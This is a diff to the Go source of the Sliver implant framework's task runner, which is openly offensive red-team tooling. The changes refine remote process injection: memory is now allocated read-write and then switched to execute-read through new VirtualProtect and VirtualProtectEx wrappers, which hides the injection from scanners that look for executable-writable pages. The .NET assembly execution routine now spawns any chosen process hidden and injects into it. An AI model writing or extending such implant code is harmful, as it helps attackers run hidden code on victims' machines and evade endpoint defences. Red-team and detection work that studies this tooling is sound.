@@ -1,5 +1,23 @@
 package taskrunner
 
+/*
+	Sliver Implant Framework
+	Copyright (C) 2019  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
 import (
 	"bytes"
 	"debug/pe"
@@ -31,13 +49,31 @@ var (
 	kernel32               = syscall.MustLoadDLL("kernel32.dll")
 	procVirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
+	procVirtualProtect     = kernel32.MustFindProc("VirtualProtect")
+	procVirtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
 	procCreateThread       = kernel32.MustFindProc("CreateThread")
 
-	ntdllPath    = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
+	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
 )
+
+func virtualProtect(lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
+	r1, _, err := procVirtualProtect.Call(lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
+	if uint(r1) == 0 {
+		return err
+	}
+	return nil
+}
+
+func virtualProtectEx(handle syscall.Handle, lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
+	r1, _, err := procVirtualProtectEx.Call(uintptr(handle), lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
+	if uint(r1) == 0 {
+		return err
+	}
+	return nil
+}
 
 func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
 	r1, _, e1 := procVirtualAllocEx.Call(
@@ -87,7 +123,7 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 
 func sysAlloc(size int) (uintptr, error) {
 	n := uintptr(size)
-	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
+	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, syscall.PAGE_READWRITE)
 	if addr == 0 {
 		return 0, err
 	}
@@ -183,7 +219,7 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 	// {{if .Debug}}
 	log.Println("allocating remote process memory ...")
 	// {{end}}
-	remoteAddr, err := virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	remoteAddr, err := virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
 	// {{if .Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	// {{end}}
@@ -203,6 +239,15 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 		// {{if .Debug}}
 		log.Printf("[!] failed to write data into remote process")
 		// {{end}}
+		return err
+	}
+	var oldProtect int
+	// Set proper page permissions
+	err = virtualProtectEx(processHandle, remoteAddr, uint(dataSize), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtectEx failed:", err)
+		//{{end}}
 		return err
 	}
 
@@ -260,6 +305,14 @@ func LocalTask(data []byte) error {
 	for index := 0; index < size; index++ {
 		buf[index] = data[index]
 	}
+	var oldProtect int
+	err = virtualProtect(addr, uint(size), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtect failed:", err)
+		//{{end}}
+		return err
+	}
 	// {{if .Debug}}
 	log.Printf("creating local thread with start address: 0x%08x", addr)
 	// {{end}}
@@ -267,7 +320,7 @@ func LocalTask(data []byte) error {
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) (string, error) {
+func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
 	err := RefreshPE(ntdllPath)
 	if err != nil {
 		return "", err
@@ -283,7 +336,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 	if len(assembly) > MAX_ASSEMBLY_LENGTH {
 		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
 	}
-	cmd := exec.Command("notepad.exe")
+	cmd := exec.Command(process)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow: true,
 	}
@@ -292,10 +345,16 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 	stderrIn, _ := cmd.StderrPipe()
 
 	var errStdout, errStderr error
-	cmd.Start()
+	err = cmd.Start()
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("Could not start process:", process)
+		//{{end}}
+		return "", err
+	}
 	pid := cmd.Process.Pid
 	// {{if .Debug}}
-	log.Println("[*] notepad.exe started, pid =", pid)
+	log.Printf("[*] %s started, pid = %d\n", process, pid)
 	// {{end}}
 	// OpenProcess with PROC_ACCESS_ALL
 	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
@@ -303,7 +362,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 		return "", err
 	}
 	// VirtualAllocEx to allocate a new memory segment into the target process
-	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
 	if err != nil {
 		return "", err
 	}
@@ -336,6 +395,15 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 	// {{if .Debug}}
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
 	// {{end}}
+	// Apply R-X perms
+	var oldProtect int
+	err = virtualProtectEx(handle, hostingDllAddr, uint(len(hostingDll)), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtectEx failed:", err)
+		//{{end}}
+		return "", err
+	}
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
 	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
